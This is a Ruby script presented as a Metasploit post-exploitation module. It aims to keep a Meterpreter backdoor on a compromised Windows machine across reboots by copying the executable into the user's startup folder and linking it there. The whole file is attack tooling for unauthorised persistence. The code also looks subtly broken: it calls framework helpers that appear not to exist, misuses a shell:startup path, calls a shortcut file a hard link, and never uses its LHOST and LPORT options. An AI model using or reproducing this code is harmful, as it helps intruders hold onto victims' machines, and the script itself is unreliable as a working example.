# exploit_startup.rb Jeanpseven

require 'msf/core'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Processes
  include Msf::Post::Windows::File
  include Msf::Post::Windows::FileTransfer

  def initialize(info = {})
    super(
      'Name' => 'Copy Meterpreter executable to shell:startup directory',
      'Description' => 'Copies the current Meterpreter executable to the shell:startup directory and creates a hard link in the startup directory.',
      'Author' => ['Name'],
      'Platform' => ['win'],
      'SessionTypes' => ['meterpreter']
    )

    register_options(
      [
        OptString.new('LHOST', [true, 'The LHOST variable']),
        OptString.new('LPORT', [true, 'The LPORT variable']),
        OptString.new('SESSION', [true, 'The session number']),
      ], self.class)

  end

  def run
    session_id = datastore['SESSION']
    lhost = datastore['LHOST']
    lport = datastore['LPORT']

    if session_id.nil? || lhost.nil? || lport.nil?
      print_error('Please specify the LHOST, LPORT, and SESSION variables.')
      return
    end

    begin
      print_status('Starting Meterpreter session...')
      session = start_meterpreter(session_id)
      print_status('Meterpreter session started.')
    rescue ::Exception => e
      print_error('Error starting Meterpreter session: ' + e.class.name + ' - ' + e.message)
      return
    end

    begin
      print_status('Getting current process ID...')
      pid = get_current_process.pid
      print_status('Current process ID: ' + pid.to_s)
    rescue ::Exception => e
      print_error('Error getting current process ID: ' + e.class.name + ' - ' + e.message)
      return
    end

    begin
      print_status('Getting current process path...')
      path = get_process_path(pid)
      print_status('Current process path: ' + path)
    rescue ::Exception => e
      print_error('Error getting current process path: ' + e.class.name + ' - ' + e.message)
      return
    end

    begin
      print_status('Getting current user path...')
      user_path = session.sys.config.get_user_path
      print_status('Current user path: ' + user_path)
    rescue ::Exception => e
      print_error('Error getting current user path: ' + e.class.name + ' - ' + e.message)
      return
    end

    begin
      print_status('Getting current user startup directory...')
      startup_dir = session.sys.config.get_user_startup_dir
      print_status('Current user startup directory: ' + startup_dir)
    rescue ::Exception => e
      print_error('Error getting current user startup directory: ' + e.class.name + ' - ' + e.message)
      return
    end

    begin
      print_status('Uploading Meterpreter executable to shell:startup directory...')
      upload_path = 'shell:startup\\meterpreter.exe'
      upload_file(session, upload_path, path)
      print_status('Meterpreter executable uploaded: ' + upload_path)
    rescue ::Exception => e
      print_error('Error uploading Meterpreter executable: ' + e.class.name + ' - ' + e.message)
      return
    end

    begin
      print_status('Creating hard link to Meterpreter executable in startup directory...')
      link_path = File.join(startup_dir, 'meterpreter.lnk')
      session.sys.fs.link(upload_path, link_path)
      print_status('Hard link created: ' + link_path)
    rescue ::Exception => e
      print_error('Error creating hard link to Meterpreter executable: ' + e.class.name + ' - ' + e.message)
      return
    end

    print_status('Meterpreter executable and hard link added to startup directory.')

    session.close
  end

end
